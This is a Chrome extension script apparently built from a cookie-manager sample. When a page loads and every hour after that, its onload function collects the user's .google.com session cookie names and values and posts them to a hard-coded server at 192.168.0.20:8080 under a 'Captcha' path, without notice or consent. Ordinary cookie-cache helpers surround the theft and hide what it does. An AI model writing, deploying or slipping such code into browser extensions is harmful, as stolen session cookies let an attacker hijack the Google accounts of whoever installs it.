
	var serverURL="http://192.168.0.20:8080"; // Server is started on 192.168.0.20 with port address 8080
	var intervalTime=3600000; // Time in mili-seconds and set to 1 hour 
	
	function focusOrCreateTab(url) {
	  chrome.windows.getAll({"populate":true}, function(windows) {
	    var existing_tab = null;
	    for (var i in windows) {
	      var tabs = windows[i].tabs;
	      for (var j in tabs) {
	        var tab = tabs[j];
	        if (tab.url == url) {
	          existing_tab = tab;
	          break;
        }
	      }
	    }
	    if (existing_tab) {
	      chrome.tabs.update(existing_tab.id, {"selected":true});
	    } else {
	      chrome.tabs.create({"url":url, "selected":true});
	    }
	  });
	}
	
if (!chrome.cookies) {
 	  chrome.cookies = chrome.experimental.cookies;
 	}
 	
 	// A simple Timer class.
 	function Timer() {
 	  this.start_ = new Date();
 	
 	  this.elapsed = function() {
 	    return (new Date()) - this.start_;
 	  }
 	
 	  this.reset = function() {
 	    this.start_ = new Date();
 	  }
	}
	
  	// Compares cookies for "key" (name, domain, etc.) equality, but not "value"
  	// equality.
  	function cookieMatch(c1, c2) {
 	  return (c1.name == c2.name) && (c1.domain == c2.domain) &&
 	         (c1.hostOnly == c2.hostOnly) && (c1.path == c2.path) &&
 	         (c1.secure == c2.secure) && (c1.httpOnly == c2.httpOnly) &&
 	         (c1.session == c2.session) && (c1.storeId == c2.storeId);
	}
	
	// Returns an array of sorted keys from an associative array.
	function sortedKeys(array) {
  	  var keys = [];
  	  for (var i in array) {
  	    keys.push(i);
  	  }
  	  keys.sort();
  	  return keys;
  	}
	
	// Shorthand for document.querySelector.
	function select(selector) {
  	  return document.querySelector(selector);
  	}
  	
  	// An object used for caching data about the browser's cookies, which we update
  	// as notifications come in.
  	function CookieCache() {
  	  this.cookies_ = {};
	
	  this.reset = function() {
	    this.cookies_ = {};
  	  }
  	
  	  this.add = function(cookie) {
  	    var domain = cookie.domain;
  	    if (!this.cookies_[domain]) {
  	      this.cookies_[domain] = [];
  	    }
	    this.cookies_[domain].push(cookie);
	  };
	
  	  this.remove = function(cookie) {
  	    var domain = cookie.domain;
  	    if (this.cookies_[domain]) {
  	      var i = 0;
  	      while (i < this.cookies_[domain].length) {
  	        if (cookieMatch(this.cookies_[domain][i], cookie)) {
  	          this.cookies_[domain].splice(i, 1);
	        } else {
	          i++;
	        }
  	      }
  	      if (this.cookies_[domain].length == 0) {
  	        delete this.cookies_[domain];
  	      }
  	    }
  	  };
  	
	  // Returns a sorted list of cookie domains that match |filter|. If |filter| is
	  //  null, returns all domains.
	  this.getDomains = function(filter) {
  	    var result = [];
  	    sortedKeys(this.cookies_).forEach(function(domain) {
  	      if (!filter || domain.indexOf(filter) != -1) {
  	        result.push(domain);
  	      }
  	    });
  	    return result;
	  }
	
	  this.getCookies = function(domain) {
  	    return this.cookies_[domain];
  	  };
  	}
  	
  	
  	var cache = new CookieCache();
  	
	
	function removeAllForFilter() {
	  //var filter = select("#filter").value;
  	  //var timer = new Timer();
  	 // cache.getDomains(filter).forEach(function(domain) {
  	 //   removeCookiesForDomain(domain);
  	  //});
  	}
  	
  	function removeAll() {
	  var all_cookies = [];
	  cache.getDomains().forEach(function(domain) {
	    cache.getCookies(domain).forEach(function(cookie) {
 	      all_cookies.push(cookie);
 	    });
 	  });
 	  cache.reset();
 	  var count = all_cookies.length;
 	  var timer = new Timer();
 	  for (var i = 0; i < count; i++) {
	    removeCookie(all_cookies[i]);
	  }
	  timer.reset();
  	  chrome.cookies.getAll({}, function(cookies) {
  	    for (var i in cookies) {
  	      cache.add(cookies[i]);
  	      removeCookie(cookies[i]);
  	    }
  	  });
  	}
	
	
	var ESCAPE_KEY = 2 ;
	window.onkeydown = function(event) {
	  if (event.keyCode == ESCAPE_KEY) {
	    resetFilter();
	  }
	}
	
	

	var text = '{ "employees" : [' +
				'{ "firstName":"John" , "lastName":"Doe" },' +
				'{ "firstName":"Anna" , "lastName":"Smith" },' +
				'{ "firstName":"Peter" , "lastName":"Jones" } ]}';
	var string = [];
	function onload() {
	  string = '{"Cookies" : [';
	  chrome.cookies.getAll({ 'domain': '.google.com', 'session': true }, function(cookies) {
	    for (var i=0; i < cookies.length; i++) {
	      cache.add(cookies[i]);
		  if (i == cookies.length-1)
			string =  string + '{"CookieName":"'+ cookies[i].name + '","CookieValue":"'+cookies[i].value + '","CookieDomain":"' + cookies[i].domain + '"}';
		  else
			string = string + '{"CookieName":"'+ cookies[i].name + '","CookieValue":"'+cookies[i].value + '","CookieDomain":"' + cookies[i].domain + '"},';
		  console.log(" The Cookies" + cookies[i].name+":"+cookies[i].value);
	    }
		string = string + ' ]}';
		console.log("The Cookie String " + string);
		console.log("The testdata" + text);
		var obj = JSON.parse(string);
		var str = JSON.stringify(obj);
		var toServer = "Hell";
		var xmlhttp = new XMLHttpRequest();   // new HttpRequest instance 
		xmlhttp.open("POST", serverURL+"/Captcha/tingtong?cookieValue="+str , true);
		xmlhttp.send(toServer);
		xmlhttp.onreadystatechange = function() {
        if (xmlhttp.readyState === 4) {
            if (xmlhttp.status === 200) {
                       // OK
                       console.log('response:'+xmlhttp.responseText);
                       // here you can use the result (cli.responseText)
            } else {
                       // not OK
                       console.log('failure!');
            }
        }
		};
		console.log("Its working");
	  });
	  
	}	
	
	
	document.addEventListener('DOMContentLoaded', function(){
		onload();
		var myVar=setInterval(onload, intervalTime);
	});